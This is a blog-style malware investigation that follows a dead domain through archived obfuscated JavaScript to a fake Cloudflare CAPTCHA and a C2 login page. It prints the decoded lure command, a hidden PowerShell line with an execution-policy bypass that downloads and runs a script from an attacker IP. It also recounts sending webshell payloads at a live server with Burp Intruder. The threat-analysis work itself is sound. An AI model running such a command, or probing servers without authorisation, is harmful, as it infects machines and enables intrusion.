# Dead Site to C2 Server Discovery - 20260314

Last month I was asked to look into a site that got blocked by an internet provider.<br>
The site, "dkaksdaksortor[.]com" was dead upon access. So I was tasked to figure out what was on this site that caused it to be blocked.

Since the site was dead, my first instinct was to check out the Wayback Machine to see if any bots had crawled the page. It was then that I noticed the page was redirecting me to a "mvjfkakfkfkaiai[.]com". I'm a month late in documenting this case, but as of typing, Wayback Machine doesn't redirect to that page anymore.<br>
**If you visit dkaksdaksortor[.]com on Wayback Machine now, you're greeted with a 403 Forbidden error.**<br>
**I'm not entirely sure why it doesn't redirect anymore, but it's possible since the .js files that were associated with it have been deleted, and so Wayback has no link back to it.**<br>
**At least, this is my best guess.**

Accessing mvjfkakfkfkaiai[.]com leads you to a 404 error.

![alt text](images/DeadtoC2images/error404.png)

That's interesting. The server exists, so what's on it?<br>
A hunch told me to check Wayback Machine again and check if it got crawled. And lo and behold, we got some URL prefix results! (As of typing, the number of .js files has increased.)

![alt text](images/DeadtoC2images/mvj_wayback.png)

The three files I looked at at the time are:<br>
・mvjfkakfkfkaiai[.]com/fasfttt.js<br>
・mvjfkakfkfkaiai[.]com/paoso.js<br>
・mvjfkakfkfkaiai[.]com/adasr.js<br>

It was time to see what kind of code was hiding in these. So I accessed them and inspected the client-side.<br>
For this documentation, I'll only be focusing on fasfttt.js.

![alt text](images/DeadtoC2images/fastfttt.png)

That is a whole lot of obfuscated code. But if we look a little closer we can see some base64 hidden in there (highlighted area).<br>
Throwing that into a decoder, it came out to: "https[:]//www[.]windowwashingexpert[.]com/lma.php".

I did briefly attempt to deobfuscate the JavaScript as well, but all I could tell was that it was excessively looping to get a specific string value, and based off certain clues in the code like "__sync_load" and "sessionStorage", it can be assumed that other than externally loading the php site we found, it was probably gathering data like hostname and timestamp.

So now that we have this suspicious php webshell, what do we do with it? The JavaScript is already suspicious enough, but we still don't have anything to deem it malicious.<br>
This is where Burp comes in handy. We'll intercept and see what we can pull from it.

**As of typing, this link now returns a 404. However, it was online at the time which you'll see the timestamp in the screenshot below. The following screenshots were taken as I was investigating.**

Looking at the lma.php webshell, there was nothing in the response in particular that stood out. At least on the client-side. If I wanted to see what was actually going on in that file, what was actually being loaded, I needed to get inside it. After some thinking, I figured this might be a good chance to try out some script injecting using Burp's Intruder Attack.<br>
I found a small list of commonly used webshell payloads and crossed my fingers. And woah! Looks like I found something big!

![alt text](images/DeadtoC2images/payload-results.png)

The length on "page" seems promising. (The image lacks the /lma.php at the end of the shown url, but we are attacking the php file.)<br>
Lets throw that into the Responder and see what comes up.

![alt text](images/DeadtoC2images/page-results.png)

In the Response we have another base64 encryption and HTML!<br>
Before we touch that base64, lets take a look at what this HTML page displaying.

![alt text](images/DeadtoC2images/verify.png)
![alt text](images/DeadtoC2images/verify2.png)

In the first image we see that this is a CAPTCHA request. The "Verify you are human" and "checkbox" are our dead give aways. Near the bottom we also Cloudflare mentioned with two of their official links. I think it's safe to say this is a fake CAPTCHA impersonating Cloudflare.

In the second image we get an idea of what happens when we click the checkbox.<br>
First we get an error for "Unusual Web Traffic Detected" so we need you do the following 3 steps of pressing "Win +R" and copy and pasting whatever command is on your clipboard.<br>
At the very bottom we see a code for your computer auto copying on click and at the top of that image we have the variable copyCommand to equal a base64. This base64 we found at the very top our Burp results.<br>
Lets decode that.<br>
Base64: cG93ZXJzaGVsbCAtd2kgbWkgLUVQIEIgLWMgaWV4KGlybSAxOTMuMTExLjExNy4yMjYvVi5HUkUp<br>
Decoded: powershell -wi mi -EP B -c iex(irm 193.111.117.226/V.GRE)

Lets dissect that.<br>
・launches powershell<br>
・-wi mi runs it minimized (otherwise hidden)<br>
・-EP B sets the execution policy to Bypass (disabling security restrictions)<br>
・iex(irm IP/file) downloads and immediately executes a remote script from the IP

Well, I think we have proof now that our suspicious webshell is indeed malicious.<br>
We can also assume that dkaksdaksortor[.]com was most likely used in a similar way as mvjfkakfkfkaiai[.]com (hosting malicious JavaScript code) due to its random spelling.

But we can do better than that. ....Right?<br>
What I really wanted was the php code, not the HTML.<br>
So I consulted with Claude, and was suggested to try a different request in Burp's Repeater. To be honest, this was completely dumb luck and I wasn't even searching for it at the time. But I tried it and.....

![alt text](images/DeadtoC2images/lamaba.png)

Adding onto the original /page request, we now have an API key and endpoint. This is our C2 server: lamabamatypod[.]com<br>
And if we go to that page, we find a login.

![alt text](images/DeadtoC2images/C2login.png)

And there we have it!<br>
We went from a dead website all the way to locating fake CAPTCHA malware (I suspect a LummaStealer varient) and then the threat actor's C2 server!<br>
Nice!